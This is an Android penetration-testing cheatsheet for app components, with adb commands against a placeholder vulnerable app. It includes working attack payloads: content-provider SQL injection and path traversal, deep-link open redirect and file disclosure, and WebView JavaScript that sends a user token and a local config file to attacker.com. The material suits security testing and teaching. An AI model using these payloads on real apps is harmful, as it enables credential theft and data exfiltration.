# Android App Components Security Cheatsheet

## **`Activities`**

#### **What is it?**

Activities define screens in an app. They can be exposed using `android:exported="true"` or via `intent-filters`.

#### **What to Look For?**

* **Exported Activities** (`android:exported="true"`) that handle sensitive actions.
* **Implicit Intents** that allow external apps to launch activities.
* **Sensitive Data Handling** via `getIntent().getExtras()`.
* **Task Hijacking** – Malicious apps inserting themselves into tasks.

#### **How to Test?**

**Check for Exported Activities**

```bash
adb shell dumpsys package com.vulnapp | grep "android:exported"
```

**Launch an Exported Activity via ADB**

```bash
adb shell am start -n com.vulnapp/.SensitiveActivity
```

**Send Malicious Data via Intent Injection**

```bash
adb shell am start -n com.vulnapp/.TransferFundsActivity --es amount "99999"
```

**Task Hijacking (Launch in a new task)**

```bash
adb shell am start -n com.vulnapp/.LoginActivity -f 0x10000000
```

***

## **`Intents`**

#### **What is it?**

Intents allow communication between app components. Exported components handling unvalidated intents can be exploited.

#### **What to Look For?**

* **Exported Components** (`android:exported="true"`) with intent-filters.
* **Implicit Intents** allowing unintended external access.
* **Unvalidated Intent Extras** that may be exploited.
* Search for **intent-handling** code e.g `Intent intent = getIntent()`.

#### **How to Test?**

**Trigger an Intent via ADB**

```bash
am start -a <action> --es <key> <value>
```

**Send Data to an Activity**

```bash
adb shell am start -n com.vulnapp/.VulnerableActivity --es "username" "hacker"
```

**Broadcast an Intent**

```bash
adb shell am broadcast -a com.vulnapp.EXPLOIT_ACTION --es "cmd" "reset_password"
```

***

## **`Services`**

#### **What is it?**

Services run background tasks. Exported services can be triggered by external applications.

#### **What to Look For?**

* **Exported Services** `<services` and (`android:exported="true"`) in `AndroidManifest.xml`.
* **Sensitive Operations** performed without authentication.
* **Binding to Services** that lack proper permission checks.

#### **How to Test?**

**List Running Services**

```bash
adb shell dumpsys activity services | grep com.vulnapp
```

**Start a Service Manually**

```bash
adb shell am startservice -n com.vulnapp/.SensitiveService
```

**Send Data to a Service**

```bash
adb shell am startservice -n com.vulnapp/.DataSyncService --es "sync" "malicious_data"
```

***

## **`Broadcast Receivers`**

#### **What is it?**

Broadcast Receivers handle system-wide and app-specific messages. If exported, they can be triggered by external sources.

#### **What to Look For?**

* **Exported Broadcast Receivers** (`android:exported="true"`) in `AndroidManifest.xml`.
* `nReceive` method for sensitive data or actions.
* **Dynamically Registered Receivers** via `registerReceiver()`.

#### **How to Test?**

**Send a Broadcast Message**

```bash
adb shell am broadcast -a com.vulnapp.EXPLOIT_ACTION --es "status" "arm"
```

**Check for Broadcast Registration in Running App**

```bash
adb shell dumpsys activity broadcasts | grep com.vulnapp
```

***

## **`Content Providers`**

#### **What is it?**

Content Providers manage access to structured data. If improperly secured, they may allow unauthorized access, SQL injection, or file traversal.

#### **What to Look For?**

* **Exported Content Providers** (`android:exported="true"`) in `AndroidManifest.xml`.
* **Sensitive Data Queries** exposed via content URIs.
* **Verify permissions**, especially protectionLevel values (e.g., dangerous or signature).
* **SQL Injection Risks** in `query()`, `insert()`, `update()`, and `delete()`.
* **Identify Table Names** Search for `content://` references in code to locate tables exposed via the ContentProvider

#### **How to Test?**

**Check for Exported Content Providers**

```bash
adb shell dumpsys package com.vulnapp | grep "provider"
```

**Query a Content Provider**

```bash
adb shell content query --uri content://com.vulnapp.provider/Users
```

**Exploit SQL Injection**

```bash
adb shell content query --uri content://com.vulnapp.provider/Users --projection "* FROM Credentials --"
```

**Attempt Path Traversal**

```bash
adb shell content read --uri content://com.vulnapp.provider/../../../../etc/hosts
```

***

## `WebView`

**What is it?**

WebView is an Android component that renders web content inside apps. Poor configurations can lead to security vulnerabilities like XSS, token theft, and local file exfiltration.

**What to Look For?**

* **`setJavaScriptEnabled(true)`** → Allows JavaScript execution, leading to potential XSS.
* **`addJavascriptInterface(Object, "interface")`** → Exposes native Android methods to JavaScript, enabling token theft or arbitrary code execution.
* **`setAllowFileAccess(true)` & `setAllowUniversalAccessFromFileURLs(true)`** → Grants WebView access to local files, allowing data exfiltration.
* **`setWebContentsDebuggingEnabled(true)`** → Exposes WebView for debugging, making it easier for attackers to inspect app behavior.
* **Loading URLs from `Intent` or `User Input`** `loadUrl()`→ Allows attackers to inject malicious URLs.

**How to Exploit?**

*   **Trigger WebView with Malicious URL via ADB:**

    ```bash
    adb shell am start -n com.vulnapp/.VulnerableWebView --es url "https://attacker.com/exploit.html"
    ```
*   **Steal User Token using JavaScript Interface:**

    ```javascript
    var token = Android.getUserToken();
    fetch('https://attacker.com/steal?token=' + token);
    ```
*   **Local File Theft using `setAllowUniversalAccessFromFileURLs(true)`**

    ```html
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'file:///data/data/com.vulnapp/shared_prefs/config.xml', true);
      xhr.onload = function() {
          fetch('https://attacker.com/exfil?data=' + btoa(xhr.responseText));
      };
      xhr.send();
    </script>
    ```

***

## `DeepLinks`

**What is it?**

Deep links allow apps to open specific activities via URLs (`app://`, `http://`). Misconfigured deep links can lead to security vulnerabilities..

**How to Test?**

*   **Find Deep Links:** Decompile APK & check **`AndroidManifest.xml`** for keywords like **BROWSABLE** and  **`<dat`** tag and **`Exported="true"` Webview** and check if **javascript enabled** .

    ```bash
    jadx -d output_folder app.apk
    ```
*   **Exploit Commands**

    ```bash
    # steal tokens
    adb shell am start -a android.intent.action.VIEW -d "app://login?token=12345"
    # Open Redirect
    adb shell am start -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=http://evil.com.target.com"
    # Local File Disclosure
    adb shell am start -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=file:///etc/hosts"
    # Exploit Lack of Authentication for actions
    adb shell am start -a android.intent.action.VIEW -d "myapp://resetpassword?token=123456"
    ```
